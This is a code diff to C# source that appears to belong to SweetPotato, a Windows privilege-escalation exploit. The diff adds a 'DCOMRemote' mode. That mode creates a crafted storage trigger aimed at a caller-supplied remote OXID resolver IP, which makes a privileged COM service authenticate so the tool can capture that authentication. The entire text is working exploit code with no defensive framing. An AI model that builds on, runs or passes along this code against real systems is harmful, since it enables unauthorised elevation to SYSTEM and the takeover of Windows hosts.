@@ -24,10 +24,12 @@ namespace SweetPotato {
         Guid clsId;
         readonly int port;
         Mode mode;
+        string oxidResolverIp;
         volatile bool dcomComplete = false;
 
         public enum Mode {
             DCOM,
+            DCOMRemote,
             WinRM,
             EfsRpc,
             PrintSpoofer
@@ -47,12 +49,12 @@ namespace SweetPotato {
 
         EventWaitHandle readyEvent = new EventWaitHandle(false, EventResetMode.AutoReset);
 
-        public PotatoAPI(Guid clsId, ushort port, Mode mode) {
+        public PotatoAPI(Guid clsId, ushort port, Mode mode, string oxidResolverIp = "") {
 
             this.clsId = clsId;
             this.port = port;
             this.mode = mode;
-
+            this.oxidResolverIp = oxidResolverIp;
             switch (mode) {
                 case Mode.DCOM:
                     StartCOMListenerThread();
@@ -233,6 +235,19 @@ namespace SweetPotato {
                         qis[0].pIID = Ole32.IID_IUnknownPtr;
 
                         Ole32.CoGetInstanceFromIStorage(null, ref clsId, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);
+                        result = negotiator.Authenticated;
+                        break;
+
+                    case Mode.DCOMRemote:
+
+                        Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out  lockBytes);
+                        Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out storage);
+                        RemoteStorageTrigger remoteStorageTrigger = new RemoteStorageTrigger(storage, string.Format("{0}", oxidResolverIp), TowerProtocol.EPM_PROTOCOL_TCP);
+
+                        qis = new Ole32.MULTI_QI[1];
+                        qis[0].pIID = Ole32.IID_IUnknownPtr;
+
+                        Ole32.CoGetInstanceFromIStorage(null, ref clsId, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, remoteStorageTrigger, 1, qis);
                         result = negotiator.Authenticated;
                         break;
 
